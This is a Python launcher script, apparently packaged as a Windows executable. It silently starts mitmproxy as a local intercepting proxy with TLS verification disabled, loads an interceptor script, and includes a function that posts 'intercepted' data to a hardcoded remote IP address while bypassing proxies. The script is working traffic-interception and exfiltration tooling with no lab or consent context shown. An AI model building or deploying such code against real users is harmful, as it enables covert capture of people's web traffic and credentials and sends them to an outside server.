import os
import subprocess
import requests
import sys
import time
from pathlib import Path

# Configuration
MITM_SCRIPT = "mitm_interceptor.py"
SERVER_URL = "http://18.140.67.178:9090/intercepted" # Web Server
#SERVER_URL = "http://127.0.0.1:9090/intercepted" # localhost


# Get the correct path when running as an .exe
if getattr(sys, 'frozen', False):
    BASE_DIR = Path(sys.executable).parent  # If running as .exe
else:
    BASE_DIR = Path(__file__).parent  # If running as .py script

MITM_SCRIPT_PATH = BASE_DIR / MITM_SCRIPT
MITM_EXECUTABLE = BASE_DIR / "mitmdump.exe"  # Ensure mitmdump.exe is in the same directory

def is_mitmproxy_running():
    """Check if MITMProxy is already running."""
    try:
        output = subprocess.run(["tasklist"], stdout=subprocess.PIPE, text=True)
        return "mitmdump.exe" in output.stdout
    except Exception as e:
        print(f"[ERROR] Failed to check MITMProxy status: {e}")
        return False

def start_mitmproxy():
    """Starts MITMProxy and ensures it is running before connecting to the MITM server."""
    if is_mitmproxy_running():
        print("[INFO] MITMProxy is already running.")
        return

    try:
        print("[INFO] Starting MITMProxy...")
        subprocess.Popen(
            [
                str(MITM_EXECUTABLE),
                "--mode", "regular@8080",
                "--listen-host", "127.0.0.1",
                "--ssl-insecure",
                "-s", str(MITM_SCRIPT_PATH)
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        print("[INFO] MITMProxy started successfully.")
    except Exception as e:
        print(f"[ERROR] Exception while starting MITMProxy: {e}")

def send_to_server(data):
    """Send intercepted data to the Flask server."""
    try:
        response = requests.post(SERVER_URL, json=data, proxies={"http": None, "https": None})
        if response.status_code == 200:
            print(f"[INFO] Sent log to server: {data}")
        else:
            print(f"[ERROR] Server responded with status code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] Failed to send log: {e}")


if __name__ == "__main__":
    print("[INFO] Starting MITMProxy...")
    start_mitmproxy()

